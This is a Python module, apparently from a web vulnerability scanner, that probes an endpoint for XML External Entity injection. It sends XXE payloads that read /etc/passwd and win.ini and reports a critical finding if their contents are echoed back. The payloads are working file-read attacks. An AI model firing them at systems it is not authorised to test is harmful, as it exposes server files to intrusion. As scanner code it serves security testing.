"""xxe — XML External Entity injection (in-band file read).

Only meaningful when the endpoint parses an XML request body. Sends a benign
external-entity document pointing at the server's own /etc/passwd and checks
whether the entity is expanded into the response. No billion-laughs / DoS.
"""
import re
from common import Finding

NAME = "xxe"

PASSWD_RE = re.compile(r"root:.*:0:0:")

XXE_DOC = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    '<data>&xxe;</data>'
)
XXE_WIN = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
    '<data>&xxe;</data>'
)


def run(client, opts):
    out = []
    for doc, label in [(XXE_DOC, "file:///etc/passwd"), (XXE_WIN, "win.ini")]:
        r = client.request("POST", data=doc.encode(),
                           extra_headers={"Content-Type": "application/xml"})
        if PASSWD_RE.search(r.body):
            out.append(Finding(NAME, "critical", "XXE — external entity file read",
                               f"external entity {label} expanded into response",
                               "root:...:0:0:"))
            return out
        if "[fonts]" in r.body.lower() or "[extensions]" in r.body.lower():
            out.append(Finding(NAME, "critical", "XXE — external entity file read (Windows)",
                               f"external entity {label} expanded into response", r.body[:80]))
            return out
    # If the endpoint rejects XML entirely we simply report nothing actionable.
    return out
